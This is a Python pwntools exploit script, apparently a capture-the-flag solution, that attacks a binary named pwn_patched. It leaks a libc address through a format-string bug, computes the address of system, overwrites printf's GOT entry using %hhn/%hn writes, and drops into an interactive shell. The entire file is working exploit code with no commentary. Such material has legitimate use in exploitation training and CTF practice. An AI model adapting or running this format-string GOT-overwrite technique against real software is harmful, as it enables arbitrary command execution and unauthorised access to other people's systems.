
from pwn import *
import sys
context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux')

file_name = './pwn_patched' 
libc_name = './libc.so.6'

elf = ELF(file_name)
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)       else 0
switch = 1 if ('remote' in sys.argv)    else 0
debug  = 0 if ('deoff'  in sys.argv)    else 1


if switch:
    target = '127.0.0.1'
    port   = 45565
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

s    = lambda data               : p.send(data)
sa   = lambda delim, data        : p.sendafter(delim, data)
sl   = lambda data               : p.sendline(data)
sla  = lambda delim, data        : p.sendlineafter(delim, data)
r    = lambda numb=4096          : p.recv(numb)
ru   = lambda delim, drop=True   : p.recvuntil(delim, drop)
rl   = lambda                    : p.recvline()
lg   = lambda name, data         : log.success(name + ': ' + hex(data))
uu64 = lambda data               : u64(data.ljust(8, b'\x00'))

payload=b'%11$p'
s(payload)
addr=int(p.recv(14),16)
libc.address=addr-0x29d90
lg('libc基址',libc.address)
sys_addr=libc.sym['system']
low1 = sys_addr & 0xff
low2 = (sys_addr>>8) & 0xffff 

def sa1(pay):
    sa(b'hell.',pay)

sa1(b'sh\x00%')

payload=p64(elf.got['printf'])+p64(elf.got['printf']+1)[:7]
sa1(payload)

current_written = 0 
pad1 = (low1 - current_written) % 0x100
if pad1 > 0:
    payload = f'%{pad1}c%24$hhn'.encode()
    current_written += pad1
else:
    payload = b'%24$hhn'
pad2 = (low2 - current_written) % 0x10000
if pad2 > 0:
    payload += f'%{pad2}c%25$hn'.encode()
else:
    payload += b'%25$hn'   
payload = payload.ljust(26, b'a')
sa1(payload)

p.interactive()